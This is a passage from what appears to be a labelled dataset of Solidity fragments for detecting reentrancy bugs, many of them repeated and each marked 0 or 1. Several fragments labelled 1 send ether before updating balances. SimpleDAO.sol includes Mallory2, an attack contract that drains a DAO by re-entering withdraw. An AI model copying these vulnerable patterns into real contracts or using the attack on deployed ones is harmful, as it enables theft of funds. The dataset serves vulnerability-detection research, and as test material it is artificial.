uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
404 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
405 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
406 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
407 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
408 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
409 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
410 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
411 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
412 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
413 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
414 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
415 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
416 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
417 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
418 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
419 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
420 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
421 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
422 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
423 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
424 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
425 40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
426 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
427 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
428 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
429 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
430 SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
1
---------------------------------
431 32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(address indexed identity, address indexed creator, address owner, address indexed recoveryKey);
event LogOwnerAdded(address indexed identity, address indexed owner, address instigator);
event LogOwnerRemoved(address indexed identity, address indexed owner, address instigator);
event LogRecoveryChanged(address indexed identity, address indexed recoveryKey,address instigator);
event LogMigrationInitiated(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationCanceled(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationFinalized(address indexed identity, address indexed newIdManager, address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
modifier validAddress(address addr) {
require(addr != address(0));
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
432 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
433 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
434 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
435 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
436 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
437 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
438 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
439 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
440 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
441 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
442 18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
443 Reentrance_01.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){ throw; }
userBalance[msg.sender] = 0;
1
---------------------------------
444 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
445 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
446 25808.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
447 Victim.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
1
---------------------------------
448 1751.sol
function proxy(address target, bytes data) public payable {
target.call.value(msg.value)(data);
contract VaultProxy is Proxy {
address public Owner;
mapping (address => uint256) public Deposits;
0
---------------------------------
449 14579.sol
function pay() public onlyOwner whenNotCanceled {
require(weiCollected > 0);
uint256 fee;
uint256 netAmount;
(fee, netAmount) = _getFeeAndNetAmount(weiCollected);
require(address(sale).call.value(netAmount)(this));
tokensReceived = getToken().balanceOf(this);
if (fee != 0) {
manager.transfer(fee);
paid = true;
emit Paid(netAmount, fee);
0
---------------------------------
450 18425.sol
function payout() public {
